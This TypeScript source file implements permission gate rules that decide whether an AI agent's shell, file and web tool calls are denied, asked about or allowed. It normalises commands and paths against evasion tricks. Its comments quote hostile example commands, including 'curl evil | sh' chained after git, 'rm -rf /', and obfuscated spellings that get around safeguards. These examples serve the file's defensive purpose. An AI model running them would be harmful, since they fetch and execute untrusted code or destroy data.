/**
 * Gate rules: the owner's sentence-shaped refinements on top of an agent's approval mode (Settings -> Gates).
 *
 * PURE and dependency-free (types only): the same function runs in the engine on every tool call, in the Settings
 * "Try it" tester, and in tests. It decides nothing about availability — needsApproval stays the floor and rules
 * only refine the APPROVAL question, never tool possession (host.enabled / connectors remain the opt-in).
 *
 * The whole precedence, in four lines (Claude Code's permission grammar, verified on its live docs):
 *   1. Rails are decided BEFORE this call (connector writes, web-egress-after-connector, "full never cards").
 *      A rule can neither loosen nor tighten them; decideGate never sees a rail-decided call.
 *   2. DENY — any matching deny rule, in EVERY mode including `full` (the one rule class that survives full:
 *      "never let this happen" must never be silently ignored, and it is stricter, so it breaks no owner rule).
 *   3. ASK — any matching ask rule, inert in `full` (owner rule 2026-10-04: in full a guard never shows a card;
 *      a rule that cards a full-access bot would break the stated contract. Use Block to stop something in full).
 *   4. ALLOW — any matching allow rule, ignored on a capped run (the confused-deputy guard: a run started by
 *      another bot may only be made STRICTER, never looser).
 *   Otherwise `baseline`: the caller applies needsApproval() exactly as before. With rules=[] the verdict is
 *   `baseline` for every input — behaviour byte-identical to the pre-gates release.
 *
 * Rule class NEVER reorders by specificity: a broad deny beats a narrow allow, and an allow can never carve out
 * of a deny. Within one class every matching rule agrees on the verdict, so `ruleIds` lists every rule whose
 * `when` matched (config order) for the "why am I asking?" popover.
 */
import type { GateRule, GateVerdict, GateWhen } from '../shared/types.js';
import { canonicalHost } from '../shared/web-verdict.js';
import type { RunMode } from './permission-mode.js';

/**
 * Tool groups a rule's `when.tools` may name (the UI writes these; nobody types raw tool names). A group is
 * expanded to concrete names/prefixes at match time, so a rule written today keeps meaning the same thing when
 * a tool is added later.
 */
export const GATE_TOOL_GROUPS: Record<string, readonly string[]> = {
  /** Commands run through a shell: Claude Code's Bash and the agent shell's `mcp__host__shell`. */
  shell: ['Bash', 'mcp__host__shell'],
  /** File writes: Claude Code's edit tools plus the agent shell's write. */
  edits: ['Write', 'Edit', 'MultiEdit', 'NotebookEdit', 'mcp__host__write_file'],
  /** File/one-shot reads: needsApproval's read-only set (less the task list, its own group below), plus the agent shell's read. */
  reads: ['Read', 'Glob', 'Grep', 'LS', 'WebSearch', 'WebFetch', 'Task', 'Agent', 'mcp__host__read_file'],
  /** The run's own task list on every runtime: Claude Code's TodoWrite and Task tools, and a provider run's todo_* tools. */
  tasks: ['TodoWrite', 'TaskCreate', 'TaskUpdate', 'TaskList', 'TaskGet', 'mcp__legion__todo_create', 'mcp__legion__todo_update', 'mcp__legion__todo_list', 'mcp__legion__todo_get'],
  web: ['WebFetch', 'WebSearch'],
  /** The agent shell's own tools (server `host` in src/core/exec/host-tools.ts). */
  host: ['mcp__host__shell', 'mcp__host__read_file', 'mcp__host__write_file'],
  connectors: ['mcp__legion_connectors__'],
  blender: ['mcp__legion_blender__'],
};

/** What one tool call looks like to the gate. */
export interface GateCall {
  toolName: string;
  input?: Record<string, unknown>;
  agentId?: string;
  projectId?: string;
  /**
   * The project the run was queued in. A run that lost it mid-way (archived, agent removed) still meets that project's
   * deny and ask rules for the rest of the run; its allow rules need the project now (projectId).
   */
  startProjectId?: string;
  /** The agent's working dir, used to resolve relative file paths and redirects. Pure string work; no fs. */
  cwd?: string;
  /** The real temp folder where `/tmp` means it (the agent shell on Windows). Lets deny and ask rules see both spellings. */
  tmpDir?: string;
  /** Run contexts. `capped` mirrors decideGate's own argument so a caller can pass it in either place. */
  ctx?: { capped?: boolean; roomHop?: boolean; tainted?: boolean; connectorData?: boolean };
}

export interface GateDecision {
  /** `baseline` = no rule decided it: apply needsApproval() exactly as before. */
  verdict: GateVerdict | 'baseline';
  /** Every rule whose `when` matched this call, in config order — including inert ones, for the explanation. */
  ruleIds: string[];
}

/** Characters that mean something inside a regex and must be matched literally. */
const RE_ESCAPE = /[.+^${}()|[\]\\-]/g;

/** fnmatch-style: `*` = any run of characters, `?` = one character; case-insensitive. */
function globRe(glob: string): RegExp {
  let s = '';
  for (const ch of glob) s += ch === '*' ? '.*' : ch === '?' ? '[^/]' : ch.replace(RE_ESCAPE, '\$&');
  return new RegExp(`^${s}$`, 'i');
}

/** `mcp__<server>__*`, a server prefix (`mcp__github__`), a group name, or an exact tool name. */
function toolMatches(entry: string, toolName: string): boolean {
  const g = GATE_TOOL_GROUPS[entry];
  if (g) return g.some((t) => toolMatches(t, toolName));
  // A prefix entry like `mcp__github__` means "any tool of that server"; a trailing `*` is a plain glob.
  if (entry.endsWith('__') || entry.endsWith('*')) return globRe(entry.endsWith('*') ? entry : `${entry}*`).test(toolName);
  return entry === toolName;
}

/**
 * One redirect token, whatever the spacing: `> x`, `>>x`, `2> x`, `2>&1`, `< in`. Group 3 is the file target
 * (undefined for an fd-only redirect like `2>&1`). Fresh regex per call: matchAll needs its own /g object.
 */
const redirectRe = (): RegExp => /(\d*\&\d+|>\&\d+|\d?>>?|<)\s*("([^"]+)"|'([^']+)'|([^\s;|&]+))?/g;

/** Redirect targets (`> x`, `2> x`, `> "x y"`) as extra path candidates; fd-only redirects (`2>&1`) have none. */
function redirectTargets(cmd: string): string[] {
  const out: string[] = [];
  for (const m of cmd.matchAll(redirectRe())) {
    const t = m[3] ?? m[4] ?? m[5];
    if (t && !/^&?\d+$/.test(t)) out.push(t);
  }
  return out;
}

/** The command with redirect syntax removed (`git push > out` -> `git push`), so separators and verbs stay clean. */
function stripRedirects(cmd: string): string {
  return cmd.replace(redirectRe(), ' ');
}

/**
 * Split a command line into subcommands the way Claude Code does: `&&`, `||`, `;`, `|`, `&` and newlines each
 * start a new subcommand, and a rule must match subcommands on its own. Redirection is removed first — it is not
 * a separator — after its targets were collected for path matching.
 *
 * This reading is for deny and ask: it also splits a separator quoted as data (`echo "x; rm -rf /"`), the safe
 * direction for a rule that stops things. An allow is judged on `allowSubcommands`, which splits as the shell does.
 */
export function splitCommand(cmd: string): string[] {
  return stripRedirects(cmd).split(/&&|\|\||[;|&\n\r]+/).map((s) => s.trim()).filter(Boolean);
}

/**
 * The subcommands an ALLOW is judged on. The same line can run in bash (the Bash tool) or in cmd.exe (the agent shell
 * on Windows), and those two read quotes differently, so only what BOTH read as data is kept together: a double-quoted
 * text with no `\`, `$` or backtick in it (`echo "a; b"` is one command). Single quotes and backslashes are ordinary
 * characters here (cmd quotes with neither), so a separator next to them splits — the safe direction for an allow.
 * Undefined — no allow can hold — when the line runs code inside an argument (`$(…)`, backticks, `<(…)`, `>(…)`),
 * uses bash's `$'…'` quoting, or leaves a double quote open, or a double-quoted text holds `\`, `$` or a backtick.
 * Deny and ask keep `splitCommand`'s wider reading.
 */
export function allowSubcommands(cmd: string): string[] | undefined {
  if (/`|[$<>]\(|\$'/.test(cmd)) return undefined;
  const subs: string[] = [];
  let cur = '';
  let quoted = false;
  for (let i = 0; i < cmd.length; i++) {
    const c = cmd[i]!;
    if (quoted) {
      if (c === '\\' || c === '$') return undefined;
      cur += c;
      if (c === '"') quoted = false;
      continue;
    }
    if (c === '"') { quoted = true; cur += c; continue; }
    const two = cmd.slice(i, i + 2);
    // `2>&1`, `>&2` and `&>` are redirects, not the background separator
    const redirectAmp = c === '&' && (cur.endsWith('>') || cur.endsWith('<') || cmd[i + 1] === '>');
    if (two === '&&' || two === '||') { subs.push(cur); cur = ''; i++; continue; }
    if (!redirectAmp && ';|&\n\r'.includes(c)) { subs.push(cur); cur = ''; continue; }
    cur += c;
  }
  if (quoted) return undefined;
  subs.push(cur);
  return subs.map((s) => stripRedirects(s).trim()).filter(Boolean);
}

/**
 * The forms a command is matched under, so quoting tricks cannot sidestep a rule (the text is de-obfuscated first):
 * the raw text, and the text with quote characters removed (`r"m -rf` matches a `rm -rf *` deny).
 */
export function commandVariants(cmd: string): string[] {
  const base = cmd.replace(/\s+/g, ' ').trim().toLowerCase();
  const dequoted = base.replace(/\\(['"`])/g, '$1').replace(/['"`]/g, '');
  return dequoted === base ? [base] : [base, dequoted];
}

/** One subcommand matches a pattern if ANY normalized variant does. */
function cmdMatches(pattern: string, sub: string): boolean {
  const re = globRe(pattern.trim().toLowerCase());
  return commandVariants(sub).some((v) => re.test(v));
}

/** Programs that run the rest of the line as the command: `sudo rm …` is an rm. Their own options (`-u root`, `X=1`) are skipped. */
const WRAPPERS = new Set(['sudo', 'doas', 'command', 'builtin', 'exec', 'env', 'nice', 'nohup', 'time', 'xargs']);
const WRAPPER_OPTS_WITH_ARG = new Set(['-u', '-g', '-p', '-h', '-n']);
/** Shells that run a command line given after their command flag (`bash -c "…"`, `cmd /c …`, `powershell -Command …`). */
const SHELLS = new Set(['bash', 'sh', 'zsh', 'dash', 'ksh', 'fish', 'cmd', 'powershell', 'pwsh']);
const SHELL_COMMAND_FLAGS = new Set(['-c', '/c', '/k', '-command']);
/** Long flags with a one-letter twin, so `--recursive --force` reads as `-rf`. */
const LONG_FLAGS: Record<string, string> = { '--recursive': 'r', '--force': 'f' };

/** `/bin/rm`, `C:\Tools\rm.exe` and `rm` are the same program. */
const programOf = (w: string): string => w.replace(/^.*[\\/]/, '').replace(/\.exe$/, '');

/**
 * One spelling for a command's leading options: short flags merged and sorted (`-r -f`, `-fr`, `-Rf` and `--recursive
 * --force` are all `-fr`), `--` dropped. Words after the first non-option word are kept as they are.
 */
function canonicalWords(words: readonly string[]): string[] {
  if (!words.length) return [];
  const letters = new Set<string>();
  const other: string[] = [];
  let i = 1;
  for (; i < words.length; i++) {
    const w = words[i]!;
    if (w === '--') { i++; break; }
    if (LONG_FLAGS[w]) letters.add(LONG_FLAGS[w]!);
    else if (/^-[a-z]+$/.test(w)) for (const ch of w.slice(1)) letters.add(ch);
    else if (w.startsWith('-') && w.length > 1) other.push(w);
    else break;
  }
  return [programOf(words[0]!), ...(letters.size ? [`-${[...letters].sort().join('')}`] : []), ...other, ...words.slice(i)];
}

/**
 * Every form a DENY or ASK rule also matches a subcommand under, so a reshaped command cannot sidestep it: escapes
 * removed (`r^m`, `r\m`), wrappers dropped (`sudo`, `env X=1`, `command`), the program's folder dropped (`/bin/rm`),
 * options in one spelling (`rm -r -f` is `rm -fr`), and the command line inside `bash -c` / `cmd /c` / `powershell
 * -Command` judged as subcommands of its own. Never used for ALLOW: each form only makes a rule match MORE commands,
 * which tightens a deny but would loosen an allow.
 *
 * Known limit, stated rather than hidden: a command that builds its text at run time (a variable, base64, a script it
 * wrote first) is not seen. Deny rules refine the approval question; they are not a sandbox.
 */
function denyForms(sub: string, depth = 0): string[] {
  const out = new Set<string>();
  for (const v of commandVariants(sub)) {
    out.add(v);
    let words = v.replace(/\^/g, '').replace(/\\(?=[a-z])/g, '').split(' ').filter(Boolean);
    while (words.length && WRAPPERS.has(programOf(words[0]!))) {
      words = words.slice(1);
      while (words.length && (words[0]!.startsWith('-') || /^[a-z_][a-z0-9_]*=/.test(words[0]!))) {
        const opt = words.shift()!;
        if (WRAPPER_OPTS_WITH_ARG.has(opt) && words.length) words.shift();
      }
    }
    if (!words.length) continue;
    const prog = programOf(words[0]!);
    const flag = words.findIndex((w, j) => j > 0 && SHELL_COMMAND_FLAGS.has(w));
    if (SHELLS.has(prog) && flag > 0 && depth < 2) {
      for (const inner of splitCommand(words.slice(flag + 1).join(' '))) for (const f of denyForms(inner, depth + 1)) out.add(f);
    }
    out.add(canonicalWords(words).join(' '));
  }
  return [...out];
}

/** A pattern in the same forms: `rm -rf *` is also `rm -fr *`, so it meets a command in its one spelling. */
function patternForms(pattern: string): string[] {
  const p = pattern.trim().toLowerCase().replace(/\s+/g, ' ');
  const c = canonicalWords(p.split(' ')).join(' ');
  return c === p ? [p] : [p, c];
}

/**
 * A rule's `commands` against a split command. DENY/ASK verbs fire when ANY subcommand matches in ANY of its forms
 * (a deny must not be evaded by chaining `safe-cmd && rm -rf /`, or by `sudo`, `bash -c` or `rm -r -f`); ALLOW only
 * holds when EVERY subcommand matches as written (an allow for `git *` must not approve `git push && curl evil | sh`,
 * and an allow for `rm -rf build` must not approve `sudo rm -rf build`) — Claude Code's own rule.
 */
function commandsMatch(patterns: readonly string[], subs: readonly string[], then: GateVerdict, allowSubs: readonly string[] | undefined): boolean {
  if (then === 'allow') return !!allowSubs && allowSubs.length > 0 && allowSubs.every((s) => patterns.some((p) => cmdMatches(p, s)));
  const res = patterns.flatMap(patternForms).map((p) => globRe(p));
  return subs.some((s) => denyForms(s).some((f) => res.some((re) => re.test(f))));
}

/** Forward slashes, no duplicate separators. Pure: gates.ts must stay importable in the browser bundle. */
const normPath = (p: string): string => p.replace(/\\/g, '/').replace(/\/{2,}/g, '/');

/** Drop `.` segments and fold `..` into its parent, never above the root: `a/x/../b` is `a/b`, `/../etc` is `/etc`. */
function collapseDots(p: string): string {
  const root = /^(?:[a-zA-Z]:)?\//.exec(p)?.[0] ?? '';
  const out: string[] = [];
  for (const seg of p.slice(root.length).split('/')) {
    if (seg === '' || seg === '.') continue;
    if (seg === '..') { if (out.length && out[out.length - 1] !== '..') out.pop(); else if (!root) out.push('..'); continue; }
    out.push(seg);
  }
  return root + out.join('/');
}

/** Make a path absolute against cwd (string-only: no fs, no path module — the UI bundle imports this file). */
function absolute(path: string, cwd: string): string {
  const p = normPath(path);
  if (/^[a-zA-Z]:\//.test(p) || p.startsWith('/')) return collapseDots(p);
  const c = normPath(cwd || '');
  return collapseDots(c ? `${c.replace(/\/+$/, '')}/${p}` : p);
}

/** Gitignore-style glob: a double star (with or without a following slash) crosses directories; a single star and ? do not. */
function pathGlobRe(glob: string): RegExp {
  let s = '';
  for (let i = 0; i < glob.length; i++) {
    const ch = glob[i]!;
    if (ch === '*') {
      if (glob[i + 1] === '*') {
        if (glob[i + 2] === '/') { s += '(?:[^/]+/)*'; i += 2; }
        else { s += '.*'; i += 1; }
      } else s += '[^/]*';
    } else if (ch === '?') s += '[^/]';
    else s += ch.replace(RE_ESCAPE, '\$&');
  }
  return new RegExp(`^${s}$`, 'i');
}

/** `/tmp/x` as `<tmp>/x`, or `<tmp>/x` as `/tmp/x` (case-insensitive, as Windows paths are); undefined for any other path. */
function tempForm(abs: string, tmp: string): string | undefined {
  if (!tmp) return undefined;
  if (abs === '/tmp' || abs.startsWith('/tmp/')) return tmp + abs.slice(4);
  const a = abs.toLowerCase(), t = tmp.toLowerCase();
  if (a === t || a.startsWith(t + '/')) return '/tmp' + abs.slice(tmp.length);
  return undefined;
}

/** A candidate matches a pattern when the pattern matches the whole path or a tail of it (gitignore's "any level"). */
function pathMatches(pattern: string, candidate: string, cwd: string, widen = false, tmpDir?: string): boolean {
  const pat = normPath(pattern.trim());
  if (!pat) return false;
  const abs = absolute(candidate, cwd);
  // The temp folder's other spelling (`/tmp/x` is `%TEMP%/x` in the agent shell on Windows, and back): deny and ask
  // only, like the drive form below, so a rule written one way cannot be stepped around by writing the other.
  const tmp = widen && tmpDir ? tempForm(abs, normPath(tmpDir).replace(/\/+$/, '')) : undefined;
  if (pat.startsWith('/')) return pathGlobRe(pat).test(abs) || (tmp !== undefined && pathGlobRe(pat).test(tmp));
  const c = normPath(cwd || '');
  const rel = c && abs.startsWith(c + '/') ? abs.slice(c.length + 1) : abs;
  // For deny and ask, also the path without its root (`/` or `C:/`): a `**/` or bare-name pattern never matches a
  // leading `/`, so without this a POSIX path (`/proj/src/secrets.txt`) would slip past `secrets.txt`. Never for allow:
  // a form that matches more would widen an allow.
  // Also the drive form of a Git Bash path (`/d/secrets/x` is `d:/secrets/x` on Windows), so the agent shell's own way of
  // writing a path cannot step around a deny written the Windows way. Same rule: deny and ask only, never an allow.
  const drive = /^\/([a-zA-Z])(\/.*)?$/.exec(abs);
  const forms = widen ? [abs, rel, abs.replace(/^(?:[a-zA-Z]:)?\//, ''), ...(drive ? [`${drive[1]}:${drive[2] ?? '/'}`] : []), ...(tmp ? [tmp] : [])] : [abs, rel];
  return forms.some((f) => pathGlobRe(pat).test(f))
    // A bare name (no slash) matches at any level, like gitignore: `secrets.txt` hits src/secrets.txt too.
    || (!pat.includes('/') && forms.some((f) => pathGlobRe(`**/${pat}`).test(f)));
}

/**
 * Paths against a rule's list. A `!` entry carves candidates out of the entries BEFORE it (Claude Code's rule,
 * including "`!` first carves nothing"); `exceptPaths` carves out of the whole list. The rule matches when at
 * least one candidate survives.
 *
 * The wider path form (see pathMatches) is used only where it tightens: on a deny or ask rule's own patterns, and on
 * an allow rule's carve-outs. A deny's carve-outs and an allow's patterns keep the exact form, so they never widen.
 */
function pathsMatch(when: GateWhen, candidates: readonly string[], cwd: string, then: GateVerdict, tmpDir?: string): boolean {
  const patterns = when.paths ?? [];
  if (!patterns.length) return true;
  if (!candidates.length) return false;
  const widenIn = then !== 'allow';
  const widenOut = then === 'allow';
  const carved = (p: string): boolean => (when.exceptPaths ?? []).some((e) => pathMatches(e, p, cwd, widenOut, tmpDir));
  return candidates.some((c) => {
    if (carved(c)) return false;
    let inList = false;
    for (const pat of patterns) {
      if (pat.startsWith('!')) { if (pathMatches(pat.slice(1), c, cwd, widenOut, tmpDir)) inList = false; continue; }
      if (pathMatches(pat, c, cwd, widenIn, tmpDir)) inList = true;
    }
    return inList;
  });
}

/** File-ish arguments of a call, plus redirect targets when the call carries a command. */
function pathCandidates(c: GateCall): string[] {
  const out: string[] = [];
  for (const k of ['file_path', 'path', 'notebook_path']) {
    const v = c.input?.[k];
    if (typeof v === 'string' && v.trim()) out.push(v.trim());
  }
  const cmd = c.input?.command;
  if (typeof cmd === 'string') out.push(...redirectTargets(cmd));
  return out;
}

/** Does one rule's `when` match this call? AND across fields, OR within a field; an absent field matches everything. */
export function whenMatches(when: GateWhen, c: GateCall): boolean {
  if (when.agents?.length && !(c.agentId && when.agents.includes(c.agentId))) return false;
  if (when.tools?.length && !when.tools.some((t) => toolMatches(t, c.toolName))) return false;
  if (when.commands?.length) {
    const cmd = c.input?.command;
    // A command-scoped rule cannot match a call that has no command (file tools, web tools).
    if (typeof cmd !== 'string' || !cmd.trim()) return false;
  }
  if (when.projects?.length && !(c.projectId && when.projects.includes(c.projectId))) return false;
  if (when.hosts?.length) {
    // Exact match on the canonical host of the call's url: no subdomains, no path. No url or no host means no match.
    const url = c.input?.url;
    const host = typeof url === 'string' ? canonicalHost(url) : undefined;
    if (!host || !when.hosts.includes(host)) return false;
  }
  if (when.contexts?.length) {
    const ctx = { capped: false, roomHop: false, tainted: false, connectorData: false, ...c.ctx };
    // The stored context names use dashes ('room-hop'); the call's flags are camelCase. Map, never compare raw.
    const on = (x: string): boolean => x === 'capped' ? ctx.capped === true
      : x === 'room-hop' ? ctx.roomHop === true
        : x === 'tainted' ? ctx.tainted === true
          : x === 'connector-data' ? ctx.connectorData === true : false;
    if (!when.contexts.some(on)) return false;
  }
  return true;
}

/**
 * The one decision function. `mode` is the effective mode (after the run ceiling), `capped` is true when the run
 * was started by an MCP client or another bot. Verdict `baseline` means "no rule decided: apply needsApproval".
 *
 * No I/O, no store, no config: the caller passes the rules it read (the engine re-reads config.gates on every
 * call, so a mid-task change applies on the next tool call — no restart, no prompt-cache break).
 */
export function decideGate(input: GateCall, rules: readonly GateRule[], mode: RunMode, capped: boolean): GateDecision {
  const cmd = typeof input.input?.command === 'string' ? input.input.command : undefined;
  const subs = cmd && cmd.trim() ? splitCommand(cmd) : undefined;
  const allowSubs = cmd && cmd.trim() ? allowSubcommands(cmd) : undefined;
  const candidates = pathCandidates(input);
  const call: GateCall = { ...input, ctx: { roomHop: false, tainted: false, connectorData: false, capped, ...input.ctx } };

  const matched: GateRule[] = [];
  for (const r of rules) {
    if (!r.enabled) continue;
    if (r.then === 'allow' && r.when.hosts?.length) continue; // never valid (normalizeGates refuses it); skipped here as well
    const lostProject = r.then !== 'allow' && !!call.startProjectId && call.startProjectId !== call.projectId;
    if (!whenMatches(r.when, call) && !(lostProject && whenMatches(r.when, { ...call, projectId: call.startProjectId }))) continue;
    // Command scoping is class-aware (any-subcommand for deny/ask, every-subcommand for allow); paths are the
    // same for every class. Both live here, not in whenMatches, because they need the rule's class.
    if (r.when.commands?.length && (!subs || !commandsMatch(r.when.commands, subs, r.then, allowSubs))) continue;
    if ((r.when.paths?.length || r.when.exceptPaths?.length) && !pathsMatch(r.when, candidates, input.cwd ?? '', r.then, input.tmpDir)) continue;
    matched.push(r);
  }
  const ruleIds = matched.map((r) => r.id);
  // DENY: every mode, `full` included. ASK: inert in `full` (owner rule). ALLOW: never on a capped run.
  if (matched.some((r) => r.then === 'deny')) return { verdict: 'deny', ruleIds };
  if (mode !== 'full' && matched.some((r) => r.then === 'ask')) return { verdict: 'ask', ruleIds };
  if (!capped && matched.some((r) => r.then === 'allow')) return { verdict: 'allow', ruleIds };
  return { verdict: 'baseline', ruleIds };
}
